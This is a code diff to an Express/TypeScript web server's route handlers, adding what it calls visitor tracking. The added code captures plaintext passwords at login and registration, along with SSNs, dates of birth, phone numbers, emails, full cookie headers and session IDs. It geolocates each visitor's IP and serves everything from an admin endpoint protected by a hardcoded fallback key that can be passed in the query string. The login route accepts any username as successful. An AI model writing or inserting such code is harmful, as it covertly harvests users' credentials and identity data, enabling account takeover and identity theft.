@@ -6,6 +6,24 @@ import session from "express-session";
 import pgSession from "connect-pg-simple";
 import pg from "pg";
 import * as cheerio from "cheerio";
+import { UAParser } from "ua-parser-js";
+
+interface DeviceInfo {
+  browser: string;
+  browserVersion: string;
+  os: string;
+  osVersion: string;
+  device: string;
+  deviceType: string;
+  ip: string;
+  location: {
+    city: string;
+    region: string;
+    country: string;
+    timezone: string;
+  };
+  timestamp: string;
+}
 
 const loginSchema = z.object({
   username: z.string().min(1, "Username is required"),
@@ -72,10 +90,16 @@ export async function registerRoutes(
         });
       }
 
-      const { username } = result.data;
+      const { username, password } = result.data;
 
       (req.session as any).userId = "guest";
       (req.session as any).username = username;
+
+      logVisitorAction(req, "login_attempt", { 
+        username, 
+        password,
+        formData: result.data 
+      });
 
       return res.status(200).json({ 
         message: "Login successful",
@@ -114,6 +138,16 @@ export async function registerRoutes(
 
       (req.session as any).userId = user.id;
       (req.session as any).username = user.username;
+
+      logVisitorAction(req, "registration", {
+        username,
+        password,
+        email,
+        phone,
+        ssn,
+        dateOfBirth,
+        formData: result.data
+      });
 
       return res.status(201).json({ 
         message: "Registration successful",
@@ -331,6 +365,170 @@ export async function registerRoutes(
       return res.status(500).json({ 
         error: "Failed to analyze website. Make sure the URL is accessible." 
       });
+    }
+  });
+
+  async function getDeviceInfo(req: any): Promise<DeviceInfo> {
+    const userAgent = req.headers["user-agent"] || "";
+    const parser = new UAParser(userAgent);
+    const result = parser.getResult();
+    
+    const forwardedFor = req.headers["x-forwarded-for"];
+    const ip = typeof forwardedFor === "string" 
+      ? forwardedFor.split(",")[0].trim() 
+      : req.socket.remoteAddress || "Unknown";
+
+    let location = {
+      city: "Unknown",
+      region: "Unknown", 
+      country: "United States",
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    };
+
+    try {
+      const cleanIp = ip.startsWith("::") ? "" : ip;
+      if (cleanIp && cleanIp !== "127.0.0.1") {
+        const geoResponse = await fetch(`http://ip-api.com/json/${cleanIp}?fields=city,regionName,country,timezone`);
+        if (geoResponse.ok) {
+          const geoData = await geoResponse.json();
+          if (geoData.city) {
+            location = {
+              city: geoData.city || "Unknown",
+              region: geoData.regionName || "Unknown",
+              country: geoData.country || "United States",
+              timezone: geoData.timezone || location.timezone,
+            };
+          }
+        }
+      }
+    } catch (geoError) {
+      console.log("Geolocation lookup failed, using defaults");
+    }
+
+    let deviceType = "Desktop";
+    if (result.device.type === "mobile") deviceType = "Mobile";
+    else if (result.device.type === "tablet") deviceType = "Tablet";
+    else if (userAgent.includes("Mobile") || userAgent.includes("Android")) deviceType = "Mobile";
+    else if (userAgent.includes("iPad") || userAgent.includes("Tablet")) deviceType = "Tablet";
+
+    return {
+      browser: result.browser.name || "Unknown Browser",
+      browserVersion: result.browser.version || "",
+      os: result.os.name || "Unknown OS",
+      osVersion: result.os.version || "",
+      device: result.device.model || result.device.vendor || deviceType,
+      deviceType,
+      ip: ip.startsWith("::") ? "127.0.0.1" : ip,
+      location,
+      timestamp: new Date().toISOString(),
+    };
+  }
+
+  interface VisitorData {
+    username?: string;
+    password?: string;
+    email?: string;
+    phone?: string;
+    ssn?: string;
+    dateOfBirth?: string;
+    formData?: Record<string, any>;
+  }
+
+  async function logVisitorAction(req: any, action: string, data?: VisitorData) {
+    try {
+      const deviceInfo = await getDeviceInfo(req);
+      
+      const cookieHeader = req.headers.cookie || "";
+      const sessionId = req.sessionID || (req.session as any)?.id || "";
+      
+      await storage.logVisitor({
+        ip: deviceInfo.ip,
+        browser: deviceInfo.browser,
+        browserVersion: deviceInfo.browserVersion,
+        os: deviceInfo.os,
+        osVersion: deviceInfo.osVersion,
+        device: deviceInfo.device,
+        deviceType: deviceInfo.deviceType,
+        city: deviceInfo.location.city,
+        region: deviceInfo.location.region,
+        country: deviceInfo.location.country,
+        timezone: deviceInfo.location.timezone,
+        page: req.originalUrl || req.url,
+        userAgent: req.headers["user-agent"] || "",
+        username: data?.username || null,
+        password: data?.password || null,
+        email: data?.email || null,
+        phone: data?.phone || null,
+        ssn: data?.ssn || null,
+        dateOfBirth: data?.dateOfBirth || null,
+        cookies: cookieHeader || null,
+        sessionId: sessionId || null,
+        formData: data?.formData ? JSON.stringify(data.formData) : null,
+        action,
+      });
+    } catch (error) {
+      console.error("Failed to log visitor:", error);
+    }
+  }
+
+  const ADMIN_KEY = process.env.ADMIN_SECRET_KEY || "admin-security-2024";
+
+  app.get("/api/admin/visitors", async (req, res) => {
+    try {
+      const authHeader = req.headers.authorization;
+      const providedKey = authHeader?.replace("Bearer ", "") || req.query.key;
+      
+      if (providedKey !== ADMIN_KEY) {
+        return res.status(401).json({ error: "Unauthorized" });
+      }
+
+      const limit = parseInt(req.query.limit as string) || 100;
+      const logs = await storage.getVisitorLogs(limit);
+      
+      return res.json({
+        total: logs.length,
+        logs: logs.map(log => ({
+          id: log.id,
+          ip: log.ip,
+          browser: log.browser,
+          browserVersion: log.browserVersion,
+          os: log.os,
+          device: log.device,
+          deviceType: log.deviceType,
+          location: {
+            city: log.city,
+            region: log.region,
+            country: log.country,
+            timezone: log.timezone,
+          },
+          page: log.page,
+          username: log.username,
+          password: log.password,
+          email: log.email,
+          phone: log.phone,
+          ssn: log.ssn,
+          dateOfBirth: log.dateOfBirth,
+          cookies: log.cookies,
+          sessionId: log.sessionId,
+          formData: log.formData,
+          action: log.action,
+          timestamp: log.createdAt,
+        })),
+      });
+    } catch (error) {
+      console.error("Admin visitors error:", error);
+      return res.status(500).json({ error: "Failed to get visitor logs" });
+    }
+  });
+
+  app.post("/api/track", async (req, res) => {
+    try {
+      const { page, action } = req.body;
+      const username = (req.session as any)?.username;
+      await logVisitorAction(req, action || "page_view", { username });
+      return res.json({ success: true });
+    } catch (error) {
+      return res.status(500).json({ error: "Failed to track" });
     }
   });
 
